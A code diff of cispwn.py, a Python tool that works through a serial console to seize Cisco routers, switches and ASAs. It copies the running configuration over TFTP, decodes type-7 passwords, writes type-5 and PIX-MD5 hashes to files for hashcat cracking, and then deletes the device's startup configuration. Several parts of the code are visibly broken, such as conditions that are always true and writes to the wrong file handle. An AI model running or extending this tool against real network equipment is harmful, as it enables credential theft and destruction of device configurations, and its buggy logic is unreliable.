@@ -165,19 +165,27 @@ def tftp_setup(console):
 		tftp = 1
 	elif switch == 1:
 		send_command(console, cmd= 'config t')
-		send_command(console, cmd = 'do sh ip int br')
-		send_command(console, cmd = '\40')
-		send_command(console, cmd = '\40')
-		send_command(console, cmd = '\40')
-		prompt=read_serial(console)
 		print "Setting interface options"
+		send_command(console, cmd = 'int vlan 1')
+		send_command(console, cmd = 'ip addr 192.168.1.1 255.255.255.0')
+		send_command(console, cmd = 'no shut')
+		send_command(console, cmd = 'do sh ip int br')
+		send_command(console, cmd = '')
+		send_command(console, cmd = '')
+		send_command(console, cmd = '')
+		#Checks whether a Gigabit interface is available, if not, it defaults to the first FastEthernet interface.
+		prompt=read_serial(console)
 		if "GigabitEthernet" in prompt:
 			send_command(console, cmd = 'interface Gig0/1')
 		else:
 			send_command(console, cmd = 'interface Fa0/1')
+		send_command(console, cmd = 'switch mode access')
+		send_command(console, cmd = 'switch access vlan 1')
 		send_command(console, cmd = 'no shut')
-		send_command(console, cmd = '\x03')
+		send_command(console, cmd = 'exit')
+		send_command(console, cmd = 'exit')
 		send_command(console, cmd = '')
+		subprocess.check_call(['ping','-c3','192.168.1.1'])
 		print "Interface options set"
 		tftp = 1
 
@@ -185,10 +193,9 @@ def tftp_setup(console):
 def copy_config(console):
 	#tftp the config file to the host machine for further commands
 	global tftp
+	global copied
 	print tftp
 	if tftp == 0:
-		print 'pls work'
-		print asa
 		tftp_setup(console)
 		send_command(console, cmd = 'copy run start')
 		send_command(console, cmd = '')
@@ -222,7 +229,13 @@ def crack_password(password):
 
 
 
-def decrypt_passwords(console):
+def decrypt_level7_passwords(console):
+	global copied
+	global router
+	global switch
+	global password_list
+	global passwords
+	global asa
 	if copied == 0:
 		copy_config()
 	config = open ('/srv/tftp/cispwn-config.txt', 'r') 
@@ -243,41 +256,63 @@ def decrypt_passwords(console):
 		i = 0
 		txt = open("passwords.txt", "w")
 		while i < passwords:
-			password_list[i] = interface[i] + password[i]
+			password_list[i] = interface[i] +":"+ password[i]
 			txt.write("%s\n" % password_list[i])
 			i += 1 	
 		txt.close()
 		print("The passwords and interfaces will be located in the passwords.txt file")
-	#elif asa == 1:
-	#grab the pix-md5 hash, store in file, tell user to crack manually/bruteforce
+def hash_grab(console):
+	global switch
+	global router
+	global asa
+	if asa == 1:
+	#grab the hash, store in file, tell user to crack manually/bruteforce
 		for line in config:
 			if "password ":
 				if "username":
-					line=line.replace("username ", "")
-					line=line.replace(" password ",":")
-					line=line.replace(" encrypted","")
+					line = line.replace("username ", "")
+					line = line.replace(" password ",":")
+					line = line.replace(" encrypted","")
 					password.append(line)
-				else:
-					line=line.replace("enable password ", "")
-					line=line.replace(" encrypted", "")
-					password.append(line)
-				passwords += 1
+					passwords += 1
+				elif "enable password":
+					line = line.replace("enable password ", "")
+					line = line.replace(" encrypted", "")
+					txt2 = open("asa_host_hash.txt", "w")
+					txt.write("%s\n" % line)
 		i = 0
 		txt = open("asa_hash.txt", "w")
 		while i < passwords:
 			txt.write("%s\n" % password[i])
 			i += 1
 		txt.close()
-		print("The hashes will be located in the asa_hash.txt file, use a tool to crack these pix-md5 hashes")
-	                                     		                                           
-
-
-def randomize_passwords(console):
-	if copied == 0:
-		copy_config()
-		#parse the file for passwords, replace them with random encrypted passwords
-
-
+		print("The hashes will be located in the asa_hash.txt file, use hashcat to crack these. The hash type will be specified in the README")
+	elif switch == 1 or router == 1:
+		for line in config:
+			if "secret 5":
+				if "enable":
+						line = line.replace("enable secret 5 ","enable:")
+						passwords.append(line)
+						passwords += 1
+				else:
+						line = line.replace("username ","")
+						line = line.replace(" secret 5 ",":")
+						password.append(line)
+						passwords += 1
+		if switch == 1:
+			txt = open("switch_hash.txt", "w")
+			while i < passwords:
+				txt.write("%s\n" % password[i])
+				i += 1
+			txt.close()
+			print("The hashes will be located in the switch_hash.txt file, use hashcat to crack these. The hash type will be type 500.")
+		else:
+			txt = open("router_hash.txt", "w")
+			while i < passwords:
+				txt.write("%s\n" % password[i])
+				i += 1
+			txt.close()
+			print("The hashes will be located in the router_hash.txt file, use hashcat to crack these. The hash type will be type 500.")
 def delete_config(console):
 	#delete the startup config file
 	if router == 1:
@@ -327,7 +362,6 @@ def main(argv):
 		if opt in ('-V', '--version'):
 			print 'cispwn.py ' + version
 			sys.exit()
-	print 'Yay!'
 	console=serial.Serial(
 			port = '/dev/ttyUSB0',
 			baudrate = 9600,
@@ -342,6 +376,8 @@ def main(argv):
 	#Function for entering rommon goes here
 	rommon(console)
 	copy_config(console)
+	decrypt_level7_passwords(console)
+	delete_config(console)
 
 if __name__ == "__main__":
 	main(sys.argv[1:])
